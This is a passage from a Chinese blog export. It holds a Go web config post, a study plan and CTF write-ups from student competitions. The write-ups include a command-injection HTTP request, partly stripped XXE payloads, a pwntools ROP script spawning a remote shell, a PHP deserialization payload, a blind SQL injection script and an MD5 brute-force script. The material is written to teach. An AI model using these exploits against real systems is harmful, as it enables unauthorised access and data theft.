title="修改配置文件"></a>修改配置文件</h2><p>配置文件位于config目录</p><p>我们新建一个config.yaml文件，在里面写入</p><pre class=" language-lang-txt"><code class="language-lang-txt">runmode: release                 # 开发模式, debug, release, testaddr: 8000                  # HTTP绑定端口name: puti              # API Server的名字ping_url: http://127.0.0.1:8000   # pingServer函数请求的API服务器的ip:portping_max_num: 10           # pingServer函数try的次数jwt_secret: putidemojwtseCrect013keyideOgormlog: false# tlstls:  https_open: false  addr: 8080  cert: configs/server.crt  key: configs/server.key# loggerlog:  logger_file: logs/server.log  logger_max_size: 1024   logger_max_backups: 7  logger_max_age: 31 # databasedb:  name: db_puti  addr: 127.0.0.1:3306  username: root  password: root</code></pre><h2 id="启动项目"><a href="#启动项目" class="headerlink" title="启动项目"></a>启动项目</h2><pre class=" language-lang-shell"><code class="language-lang-shell">$ go run main.go</code></pre><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191203184956.png" alt="屏幕截图"></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191203184948.png" alt="屏幕截图"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安洵杯CTF easywebpayload</title>
      <link href="/2019/11/30/ctf/web/axb/"/>
      <url>/2019/11/30/ctf/web/axb/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="easy-web"><a href="#easy-web" class="headerlink" title="easy web"></a>easy web</h2><p>payload:</p><pre class=" language-lang-txt"><code class="language-lang-txt">POST /index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=ca\t%20/flag HTTP/1.1Host: 47.108.135.45:20270User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 307Origin: http://47.108.135.45:20270Connection: closeReferer: http://47.108.135.45:20270/index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=1Upgrade-Insecure-Requests: 1a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> axbctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本学年工作计划</title>
      <link href="/2019/11/29/unfinish-work/work/"/>
      <url>/2019/11/29/unfinish-work/work/</url>
      
        <content type="html"><![CDATA[<h1 id="任务清单"><a href="#任务清单" class="headerlink" title="任务清单"></a>任务清单</h1><h2 id="网安之路"><a href="#网安之路" class="headerlink" title="网安之路"></a>网安之路</h2><ul><li>XML学习</li><li>SQLi环境搭建学习</li><li>GraphQL </li><li>完成hackone101CTF</li><li>完成hack the box</li><li>《网络空间安全基础》</li><li>《密码学与网络空间安全》</li></ul><h2 id="区块链学习之路"><a href="#区块链学习之路" class="headerlink" title="区块链学习之路"></a>区块链学习之路</h2><ul><li>Go web学习</li><li>以太坊学习</li><li>《精通以太坊智能合约开发》</li><li>学习复现黎跃春的博客</li></ul><h2 id="必学"><a href="#必学" class="headerlink" title="必学"></a>必学</h2><ul><li>Docker</li></ul><h2 id="学校要求学习内容"><a href="#学校要求学习内容" class="headerlink" title="学校要求学习内容"></a>学校要求学习内容</h2><ul><li>HTML&amp;CSS</li><li>数据结构</li><li>Java Web程序设计</li><li>python 数据分析</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>南京邮电大学 NCTF 做题记录</title>
      <link href="/2019/11/27/ctf/web/nctf/"/>
      <url>/2019/11/27/ctf/web/nctf/</url>
      
        <content type="html"><![CDATA[<h1 id="第一部分-Web"><a href="#第一部分-Web" class="headerlink" title="第一部分 Web"></a>第一部分 Web</h1><p>本着从CTF中找知识点学习的精神，这周又参加了南京邮电大学的CTF比赛，说是外校前二十名有奖，比赛的时候发现事情并不简单，，，只做出来了没几道题</p><h2 id="Fake-XML-cookbook"><a href="#Fake-XML-cookbook" class="headerlink" title="Fake XML cookbook"></a>Fake XML cookbook</h2><p>这道题与上一次UNCTF新星赛的那道XML简直一模一样（UNCTF的WP还没写….）</p><p>不过那道题的flag是放在flag.php中的</p><p>这道题他直接给了 <strong>hint: flag in /flag</strong></p><p>这就比较简单了，毕竟签到题，也没有过滤</p><p>BP抓包（题目关了，如果有复现的话再来放图）</p><p><strong>payload:</strong></p><pre class=" language-lang-xml"><code class="language-lang-xml"><!--?xml version="1.0" encoding="utf-8"?-->]&gt;<username>&amp;entityex;</username></code></pre><h2 id="True-XML-cookbook"><a href="#True-XML-cookbook" class="headerlink" title="True XML cookbook"></a>True XML cookbook</h2><p>这道题跟上道题的代码是一样的，但是<strong>flag</strong>放的位置不一样，比赛的时候没做出来，赛后看了大佬的WP后才知道，这道题考的是找内网真实地址。。</p><p>学习地址  <a href="https://www.cnblogs.com/backlion/p/9302528.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/9302528.html</a> </p><p>payload：</p><pre class=" language-lang-xml"><code class="language-lang-xml"><!--?xml version="1.0" encoding="UTF-8"?--> ]&gt;<user><username>&amp;xxe;</username><password>123</password></user></code></pre><pre class=" language-lang-xml"><code class="language-lang-xml"><!--?xml version="1.0" encoding="UTF-8"?--> ]&gt;<user><username>&amp;xxe;</username><password>123</password></user></code></pre><pre class=" language-lang-xml"><code class="language-lang-xml"><!--?xml version="1.0" encoding="UTF-8"?--> ]&gt;<user><username>&amp;xxe;</username><password>123</password></user></code></pre><h2 id="剩下的等题目复现再写吧，TCL"><a href="#剩下的等题目复现再写吧，TCL" class="headerlink" title="剩下的等题目复现再写吧，TCL"></a>剩下的等题目复现再写吧，TCL</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>成都大学第二届“玄武杯”做题记录2</title>
      <link href="/2019/11/19/ctf/pwn/cdusec-ctf2/"/>
      <url>/2019/11/19/ctf/pwn/cdusec-ctf2/</url>
      
        <content type="html"><![CDATA[<h1 id="第三部分-Pwn"><a href="#第三部分-Pwn" class="headerlink" title="第三部分 Pwn"></a>第三部分 Pwn</h1><p>本次pwn就一道题，也不难，但也是我第一次做pwn…</p><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>拿到题目，IDA走一下（64位）</p><pre class=" language-lang-c"><code class="language-lang-c">int __cdecl main(int argc, const char **argv, const char **envp){  char buf; // [sp+6h] [bp-Ah]@1  printf("tell me your name?", argv, envp);  read(0, &amp;buf, 0x64uLL);  return 0;}</code></pre><p>典型的read溢出</p><p>buf 只有0xA个字节，而read确可以读取100个字节</p><p>这就造成了溢出</p><p>我们可以溢出EBP到EIP从而控制函数的返回地址(64位一般是8个字节)</p><p>这时我们发现</p><pre class=" language-lang-c"><code class="language-lang-c">int system_bin(){  return system("/bin/bash");}</code></pre><p>新生赛吗，一切有都是那么的自然</p><p>找到system_bin函数的地址<strong>0x400577</strong></p><p>写出j简单的payload</p><pre class=" language-lang-txt"><code class="language-lang-txt">'a'*0xA + 'a'*8 + system_addr=(0x400577)</code></pre><p>然后祭出我们的pwntools</p><pre class=" language-lang-python"><code class="language-lang-python">#!/usr/bin/env python # -*- coding:utf-8 -*-from pwn import *#sh = remote('47.93.249.236',10010)system_addr=0x400577payload='a'* 18 +p64(system_addr)sh = process('./pwn')sh.sendline(payload)sh.interactive()</code></pre><p>本地测试成功</p><p>好，修改提交，出问题了</p><pre class=" language-lang-txt"><code class="language-lang-txt">sh: 1: /bin/bash: not found</code></pre><p>然后就又去学习，修改脚本，问大佬怎么回事</p><p>终于找到了</p><p>原来是出题人在docker中没有布置bash, 只布置了sh</p><p>emmm,懂了</p><p>修改脚本，找_system的地址，pop ret rdi的地址（64位与32位不一样）</p><p>大佬的解释</p><pre class=" language-lang-txt"><code class="language-lang-txt">64位程序在调用system函数时，参数的传递方式和32位不一样，32位是通过栈传参，而64位通过edi寄存器传参，所以这时我们的思路变成如何覆盖edi的值，通过基本rop就可以做到，利用程序自己的带有pop rdi;pop rdi语句是将当前的栈顶元素传递给edi，在执行pop语句时，只要保证栈顶元素是”/bin/sh”的地址，并将返回地址设置为system。</code></pre><p>emmm,学到了</p><pre class=" language-lang-txt"><code class="language-lang-txt">ROPgadget --binary pwn --only "pop|ret" | grep "rdi"</code></pre><p>在kail里运行这条命令就可以找到pop的地址</p><pre class=" language-lang-python"><code class="language-lang-python">#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *context.log_level='debug'pwn=remote('47.93.249.236',10010)elf=ELF('./pwn')        pop_addr=0x0000000000400633sys_addr=0x0000000000400460  #获取系统函数地址sh_addr=elf.search('sh').next()   #获取'bin'字符串地址payload= 'a'* 18 + p64(pop_addr)+p64(sh_addr) + p64(sys_addr)pwn.send(payload)pwn.interactive()pwn.close()</code></pre><p>成功getshell,然后就 ls,cat flag</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{cdusec_Pwn_New_Star!}</code></pre><p>还有在bugku pwn4上看到</p><pre class=" language-lang-txt"><code class="language-lang-txt">'$0'</code></pre><p>也可以当作bash,因为</p><pre class=" language-lang-txt"><code class="language-lang-txt">'$0'</code></pre><p>就是bash本身</p><h1 id="第四部分-Misc"><a href="#第四部分-Misc" class="headerlink" title="第四部分 Misc"></a>第四部分 Misc</h1><p>misc这次的比较简单，都是一些比较基础的加密方式解密方式，一共七道题。</p><h2 id="base"><a href="#base" class="headerlink" title="base"></a>base</h2><p>根据题目base16 base32 base64 解一遍就出来了</p><p>用在线网站解码也行，我试了一下次数不多，所以就直接用网站解码了，没写脚本</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{Cdu_sec_Base64}</code></pre><h2 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h2><p>放进kail里面用binwalk -e 提取一下</p><p>发现一个没有密码的压缩包</p><p>里面的内容是</p><pre class=" language-lang-txt"><code class="language-lang-txt">%26%23113%3B%26%23119%3B%26%23108%3B%26%23114%3B%26%23123%3B%26%23744810295113%3B%26%2349%3B%26%23121%3B%26%23111%3B%26%2395%3B%26%2369%3B%26%23115%3B%26%2349%3B%26%23100%3B%26%23125%3Bw+h+a+t%27s%20t+h+e%20n+e+x+t%20a+f+t+e+r+t%20t+h+e+U+R+L</code></pre><p>这一看就是url编码</p><p>然后解码</p><pre class=" language-lang-txt"><code class="language-lang-txt">qwlr{�1yo_Es1d}w h a t's t h e n e x t a f t e r t t h e U R L</code></pre><p>这在一看就是Unicode编码，不过需要改一下</p><pre class=" language-lang-txt"><code class="language-lang-txt">qwlr{J0f_q1yo_Es1d}</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">qwlr{J0f_q1yo_Es1d}//解出来这个</code></pre><p>不像flag啊</p><p>再来一次凯撒解码</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{Y0u_f1nd_Th1s}</code></pre><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>就这真的签到</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{welc0me_to_cdusec_Ctf}</code></pre><h2 id="键盘密码"><a href="#键盘密码" class="headerlink" title="键盘密码"></a>键盘密码</h2><p>键盘划线</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{CDUSEC}</code></pre><h2 id="大力出奇迹"><a href="#大力出奇迹" class="headerlink" title="大力出奇迹"></a>大力出奇迹</h2><p>zip密码爆破 ARCHPR就可以爆破</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{Aestheticization_of_violence}</code></pre><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p>wireshark 流量分析工具</p><p>跟踪TCP流量，将流调为1</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{tcpip_is_awesome}</code></pre><h2 id="密码是啥"><a href="#密码是啥" class="headerlink" title="密码是啥"></a>密码是啥</h2><p>知道了密码md5值的前四位和后三位就可以根据题目写脚本爆破了</p><p>脚本如下(python 2.7)</p><p>PS：脚本写的LOW，要爆好几分钟，据说多线程会快点，但不会写，有空在看看吧。</p><pre class=" language-lang-python"><code class="language-lang-python">#!/usr/bin/env python # -*- coding:utf-8 -*-import hashlibhead="b996"foot="3e2"word=''s="qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"for a in s:    for b in s:        for c in s:            for d in s:                for e in s:                    word=a+b+c+d+e                    mdd=word.encode()                    # print (word)                    tmp=hashlib.md5(mdd).hexdigest()                    # print(tmp)                    # if tmp[:4]==head:                    #     print(tmp)                    # print(tmp)                    # print(tmp[29:32])                    if tmp[29:32]==foot and tmp[:4]==head:                        print(tmp)                        break</code></pre><p>记得当时爆出来两个</p><pre class=" language-lang-txt"><code class="language-lang-txt">b9966524dbef725a3ad170446855d3e2b99648ad338f83a9ace00e19f97b53e2</code></pre><p>具体是哪一个我也记不清了，就当是第一个吧</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{FjcOy}</code></pre><h1 id="赛后总结"><a href="#赛后总结" class="headerlink" title="赛后总结"></a>赛后总结</h1><p>这次比赛没有密码学，总体难度比较简单，题量也不大，新手有足够的时间来搜索资料学习，辛苦出题和维护的师傅们了。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>成都大学第二届“玄武杯”做题记录</title>
      <link href="/2019/11/18/ctf/web/cdusec-ctf/"/>
      <url>/2019/11/18/ctf/web/cdusec-ctf/</url>
      
        <content type="html"><![CDATA[<h1 id="第一部分-web"><a href="#第一部分-web" class="headerlink" title="第一部分 web"></a>第一部分 web</h1><p>大概看了下加上最后两天上的那一道题，本次web一共有九道题，题目不是很难（毕竟是面向19级新生的比赛），但还是记录一下，回忆一下上一年的惨痛经历….（被大佬打蒙了）。</p><p>不要问为什么都是代码和文字，问就是图床没搭好，还在测试中…</p><h2 id="weekpassword"><a href="#weekpassword" class="headerlink" title="weekpassword"></a>weekpassword</h2><p>这题从名字上看就知道是弱口令，直接百度弱口令TOP1000，放进Bp里面跑，跑出来00000就是密码，提交就有flag</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{Fine_WeBsH3ll}</code></pre><h2 id="serialization-1"><a href="#serialization-1" class="headerlink" title="serialization-1"></a>serialization-1</h2><p>php反序列化，，，记得当初第一次参见CTF的时候就是这道题不会做，导致就差这一道题没能拿奖</p><p>题目地址： <a href="http://47.93.249.236:10009/index.php" target="_blank" rel="noopener">http://47.93.249.236:10009/index.php</a> </p><pre class=" language-lang-php"><code class="language-lang-php"><!--?phperror_reporting(0);class Test{    private $a = 'nothing';    public function __destruct()    {        if($this--->a != 'nothing') {            highlight_file('flag.php');        }        else {            echo 'No Flag!';        }    }}if(isset($_GET['data'])) {    unserialize($_GET['data']);}else {    highlight_file(__FILE__);}    ?&gt;</code></pre><p>题目给了源代码，从代码中我们可以看出来，我们要拿到flag的话，必须让 <strong>a ! =’nothing’</strong></p><p>但是 <strong>a</strong> 在声明的时候已经等于 <strong>nothing</strong> 了</p><p>而我们能控制的参数只有 <strong>data</strong> </p><pre class=" language-lang-php"><code class="language-lang-php">unserialize($_GET['data']);</code></pre><p>从这里我们看到我们传入的<strong>data</strong>参数会被<strong>unserialize()</strong> 这个函数处理</p><p>看一下 <strong>unserialize（）</strong> 这个函数的作用</p><p> <strong>将已序列化的字符串变回 PHP 的值</strong> </p><p>这就很清晰明了了</p><p>我们可以通过data传入一个已经序列化的字符串来覆盖掉 <strong>a</strong> 的值</p><pre class=" language-lang-php"><code class="language-lang-php"><!--?php    class Test{    private $a = "666";    }    $flag = new Test();    print_r(serialize($flag));?--></code></pre><p>执行这段代码后得到</p><pre class=" language-lang-php"><code class="language-lang-php">O:4:"Test":1:{s:7:"Testa";s:3:"666";}</code></pre><p>但这还不够</p><pre class=" language-lang-php"><code class="language-lang-php">O:4:"Test":1:{s:7:"%00Test%00a";s:3:"666";}</code></pre><p>由于变量 <strong>a</strong> 的类型为 <strong>private</strong></p><p>因此我们需要在类名 <strong>Test</strong> 前面加上 <strong>%00</strong> </p><p>具体要参考这篇文章  <a href="https://blog.csdn.net/qq_42196196/article/details/81217375" target="_blank" rel="noopener">https://blog.csdn.net/qq_42196196/article/details/81217375</a> （HITCON 2016一道web）</p><p>因此我们最终的payload为：</p><pre class=" language-lang-txt"><code class="language-lang-txt">http://47.93.249.236:10009/index.php?data=O:4:%22Test%22:1:{s:7:%22%00Test%00a%22;s:3:%22666%22;}</code></pre><p>访问得到 <strong>flag</strong></p><pre class=" language-lang-php"><code class="language-lang-php"><!--?php$flag = 'flag{0030-0571-8890-4673}';?--></code></pre><h2 id="百度"><a href="#百度" class="headerlink" title="百度"></a>百度</h2><p>这道题从名字上就可以知道（zuo ti zuo duo le jiu ke yi zhi dao）,关键在<strong>robots.txt</strong> 上，一般情况下网站都会有这个文件，他的主要功能就和他的文件内容 一样清晰明了</p><pre class=" language-lang-txt"><code class="language-lang-txt">User-agent: *Disallow:</code></pre><p>主要是来防爬虫，在真实的渗透测试案例中经常会出现，比如用来找<strong>admin</strong> 界面….</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{BoBo-RoRo-ToTo}</code></pre><p>还有别的不想被爬取到的页面，具体可以看百度上的的robots.txt</p><pre class=" language-lang-txt"><code class="language-lang-txt">https://www.baidu.com/robots.txt</code></pre><h2 id="SQL-1"><a href="#SQL-1" class="headerlink" title="SQL-1"></a>SQL-1</h2><p>题如其名，MySQL注入中的bool盲注</p><p>这道题用 sqlmap 就可以做，工具固然好用，但拒绝做脚本小子</p><p>但本着学习的精神，主要是好久不用<strong>python</strong>了</p><p>就写了一个简单的脚本 (python2.7)</p><pre class=" language-lang-python"><code class="language-lang-python">import requestsdef login(_username,_password):    url="http://47.93.249.236:10001/index.php"    data={        "username":_username,        "password":_password    }    response=requests.post(url,data=data)    content=response.content    if "Login Success!" in content:        return True    else:        return Falsedef find_dblen():    for i in range(10):        _username = "admin' and (length(database())) = %d #" % (i)        _password = "admin"        if login(_username, _password):            print _username            return idef find_dbname():    find_name = ""    length=find_dblen()+1    for i in range(length):        for j in range(0x80, 0x20, -1):            _username = "admin' and (ascii(substr(database(),%d,%d))=%d) #"%(i,i,j)            _password = "admin"            if login(_username, _password):                print _username                find_name += chr(j)                print find_name                breakdef find_dbtable_len():    for i in range(100):        _username = "admin' and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,2)=%d #" % (i)        _password = "admin"        if login(_username, _password):            print _username            return idef find_dbtable_name():    find_name = ""    length=find_dbtable_len()+1    for i in range(length):        for j in range(0x80, 0x20, -1):            _username = "admin' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,%d)))=%d #"%(i,i,j)            _password = "admin"            if login(_username, _password):                print _username                find_name += chr(j)                print find_name                breakdef find_dbcolum_len():    for i in range(10):        _username = "admin' and (select length(column_name) from information_schema.columns where table_name=0x7573657273 limit 0, 1) = %d #" % (i)        _password = "admin"        if login(_username, _password):            print _username            return idef find_dbcolum_name():    find_name = ""    for i in range(9):        for j in range(0x80, 0x20, -1):            _username = "admin' and ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 1,1),%d,%d))=%d #"%(i,i,j)            _password = "admin"            if login(_username, _password):                print _username                find_name += chr(j)                print find_name                breakdef find_flag():    find_name = ""    for i in range(40):        for j in range(0x80, 0x20, -1):            _username = "admin' and (ascii(substr((select password from users limit 0,1),%d,%d)))=%d #"%(i,i,j)            _password = "admin"            if login(_username, _password):                print _username                find_name += chr(j)                print find_name                breakif __name__ == '__main__':    find_flag()</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">flag{sql1-wArn1ng}</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">#sql盲注注入流程:一、猜数据库的长度    √ 4#              二、猜数据库的名字    √ mydb#              三、猜数据库中数据表的名字的长度 √ 第一个表的长度是5#              四、猜数据库中数据表的名字  表名为 users#              五、猜数据库中数据表中列的数量 √ 3#              六、猜数据库中数据表中列的名字 √ id username password#              七、猜数据库中数据表中列中字段的数量#              八、猜数据库中数据表中列中字段的名字</code></pre><p>上面是总结的一些东西，可能还不够完善</p><h2 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h2><p>这道题主要是想考察hash的长度扩展攻击，可能是出于对新生的照顾，下降了难度</p><p>题目源码</p><pre class=" language-lang-php"><code class="language-lang-php">function ctt($key){    $t="";    for($i=0;$i &lt; strlen($key) ; ++$i)    {        $t.=chr(ord($key[$i])^$i);    }    return $t;}$auth = false;$role1 = "xxxxxxxxx";$salt = "xxxxxxxxxx";//长度不超过15if (isset($_COOKIE["role_true"])) {      $hsh = $_COOKIE["hsh"];      if ($_COOKIE["role_true"] === $role1 &amp;&amp; $hsh   ===md5($salt.urldecode($_COOKIE["role"]))) {    $auth = true;} else {    $auth = false; } } else {    $s =$role1;    setcookie('role',ctt(base64_encode($s)));                $hsh = md5($salt.ctt(base64_encode($s)));    setcookie('hsh',$hsh); }   if ($auth) {   echo "Welcome Admin. Your flag is ";} else {   echo "Only True Admin can see the flag!!"; }</code></pre><p>从代码中我们可以看出，我们要想输出 <strong>flag</strong> 必须要满足</p><pre class=" language-lang-php"><code class="language-lang-php">$_COOKIE["role_true"] === $role1 &amp;&amp; $hsh === md5($salt.urldecode($_COOKIE["role"]))</code></pre><p>通过F12查看源代码 我们可以得到 </p><pre class=" language-lang-txt"><code class="language-lang-txt">role=YVPweR3oRN%3B%7Bnj32hsh=5beee4019e55f453db9daf0df7d90879</code></pre><p>分析代码写脚本解出 role</p><p>脚本 (需要先解出 <strong>url解码之后的role</strong> )</p><pre class=" language-lang-python"><code class="language-lang-python">import base64def dctt(key):    t=''    for i in range(len(key)):        t = t + chr(ord(key[i]) ^ i)    result = base64.b64decode(t)    return resultif __name__ == '__main__':    key = "YVPweR3oRN;{nj32"    print dctt(key)</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">role=adminadmin</code></pre><p>因此我们现在只需要让</p><pre class=" language-lang-txt"><code class="language-lang-txt">role_true=adminadmin</code></pre><p>就可以得出 <strong>flag</strong> </p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{hash_and_php_are_very_good!!!}</code></pre><h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><p>这题可能有问题…</p><pre class=" language-lang-php"><code class="language-lang-php">no include('flag.php');$f1 = @$_GET['f1'];$f2 = @$_POST['f2'];$f3 = @$_COOKIE['f3'];if($f2 !== '0') {    echo 'no';}else {    if($f1 == 0 and $f1 !== 0) {        $f2 == $f3;        if(md5($f2) == 0 and $f2 == 0) {            echo $flag;        }    }}</code></pre><p>还是先分析一下代码</p><p>首先 我们需要通过 GET 方式传入 f1 , POST 方式传入 f2 ,和在 cookie 中设置 f3</p><p>其次首先要满足 （依次）</p><pre class=" language-lang-php"><code class="language-lang-php">f2===0</code></pre><pre class=" language-lang-php"><code class="language-lang-php">f1=0 f1!==0</code></pre><pre class=" language-lang-php"><code class="language-lang-php">md5(f2)==0&amp;&amp;f2=0</code></pre><p>但实际过程发现，我们只要让</p><pre class=" language-lang-php"><code class="language-lang-php">f1=0abc //php是弱类型语言，会将 '0abc'看成 '0'</code></pre><pre class=" language-lang-php"><code class="language-lang-php">f2=0</code></pre><p>就可以得出flag</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{Due_to_weak_type:)}</code></pre><p>但其实我们还要传入</p><pre class=" language-lang-php"><code class="language-lang-php">f3[]=0</code></pre><p>来绕过</p><pre class=" language-lang-php"><code class="language-lang-php">md5(f2)==0&amp;&amp;f2=0</code></pre><p>可能是出题人疏忽了…,或者我想多了….</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{Due_to_weak_type:)}</code></pre><h2 id="有趣的上传点"><a href="#有趣的上传点" class="headerlink" title="有趣的上传点"></a>有趣的上传点</h2><p>确实有趣，一点思路没有，上传过去文件就没了，访问也访问不到，用工具扫出来了XSS，但用不了…</p><p>真的不会写，也没人做出来，赛后看官方WP后在写一篇专门关于这个题的吧</p><h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><p>POST传参数，用火狐的hackbar或者Bp抓包改请求方式都可以</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{Tw0~E4sy-pHp}</code></pre><h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><p>GET传参数，直接在URL后面写就行</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{A~E4sy-pHp}</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>web部分到这里就完了，每道题都不是很难，关键是找里面的知识点来学，难的题也不过就是把一些简单的知识点给集合起来，关于GET,POST请求部分的东西我会放在GO Web学习当中来讨论。</p><h1 id="第二部分-Reverse"><a href="#第二部分-Reverse" class="headerlink" title="第二部分 Reverse"></a>第二部分 Reverse</h1><p>这一部分总共有5道题，除了点击一千次有点废百度之外，其他的题都还是很基础的</p><h2 id="Android-Studio-Usage"><a href="#Android-Studio-Usage" class="headerlink" title="Android Studio Usage"></a>Android Studio Usage</h2><p>安卓逆向题，主要考察的就是安卓程序的结构，但flag 一开始给错了，加上那个hanhan的函数让我觉得我也找错了，直到flag改了回来。我人傻了，我就是个hanhan,还下了Android Studio来找，找来找去也就那一串…..</p><p>不多说了，先放一下Android 程序的结构</p><pre class=" language-lang-txt"><code class="language-lang-txt">EMMM,图床没搭好先不放了，</code></pre><p>根据结构我们可以知道主程序的位置就在</p><pre class=" language-lang-txt"><code class="language-lang-txt">\MyApplication\app\src\main\java\</code></pre><p>里面，而里面只有一个hanhan.java</p><p>里面的内容是</p><pre class=" language-lang-java"><code class="language-lang-java">import java.util.Scanner;public class hanhan {    public static void main(String[] args) {        // TODO Auto-generated method stub        Scanner in =new Scanner(System.in);        String yours;        String people="ZmxhZ3tZb3UgYXJlIHNpbXBsZSBhbmQgaG9uZXN0fQ==";    }}</code></pre><p>那  flag 就显而易见了，</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{You are simple and honest}</code></pre><h2 id="猜数？"><a href="#猜数？" class="headerlink" title="猜数？"></a>猜数？</h2><p>IDA 源代码（64位）分析 发现</p><pre class=" language-lang-c"><code class="language-lang-c">#include<studio.h>int main(){  int result; // eax@4  __int64 v4; // rsi@4  __int64 v5; // [sp+8h] [bp-38h]@1  __int64 v6; // [sp+10h] [bp-30h]@1  __int64 v7; // [sp+18h] [bp-28h]@1  __int64 v8; // [sp+20h] [bp-20h]@1  __int64 v9; // [sp+28h] [bp-18h]@1  __int64 v10; // [sp+30h] [bp-10h]@1  __int64 v11; // [sp+38h] 